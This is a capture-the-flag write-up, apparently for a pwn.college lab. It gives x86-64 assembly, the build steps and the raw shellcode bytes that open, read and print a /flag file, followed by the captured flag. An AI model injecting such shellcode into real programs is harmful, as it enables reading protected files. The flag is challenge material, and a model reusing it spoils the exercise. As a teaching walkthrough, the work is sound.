### What is shellcode?

A shellcode is a small piece of code that is used to exploit vulnerabilities in a program. 

Shellcodes are injected into a programs memory through input buffer after which it is executed by the program.

&nbsp;

For this challenge we have to write a shellcode which reads the `/flag` file and prints its content. 



    mov rax, 0x00000067616c662f         "\flag" in hexadecimal
    push rax                            

    mov rdi, rsp                        rdi points to file name                      
    mov rsi, 0                          no flags 
    mov rax, 2                          open syscall
    syscall

    mov rdi, rax                        file descriptor
    mov rsi, rsp                        buffer  (load the content onto the stack)
    mov rdx, 1000                       size of buffer 
    mov rax, 0                          read syscall
    syscall

    mov rdi, 1                          file descriptor
    mov rsi, rsp                        buffer
    mov rdx, rax                        size of buffer
    mov rax, 1                          write syscall
    syscall

    mov rdi, 42                         error code 42 (it has no meaning)
    mov rax, 60                         exit syscall 
    syscall

(https://syscall.sh) 

Now we will convert this to an elf file and copy the .text section into another file
    
    gcc -nostdlib -static shellCode.S -o shellCode-elf
    objcopy --dump-section .text=shellCode-raw shellCode-elf

This is the shellcode
    
    \x48\xb8\x2f\x66\x6c\x61\x67\x00\x00\x00\x50\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\xe8\x03\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x48\x89\xc2\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\xc7\xc7\x2a\x00\x00\x00\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05

Now we simply just give this as an input to the program and we will get out flag

pwn.college{ASev13ZgDZChX__GXrv_cY_5nIr.01NxIDL5kzM1czW}
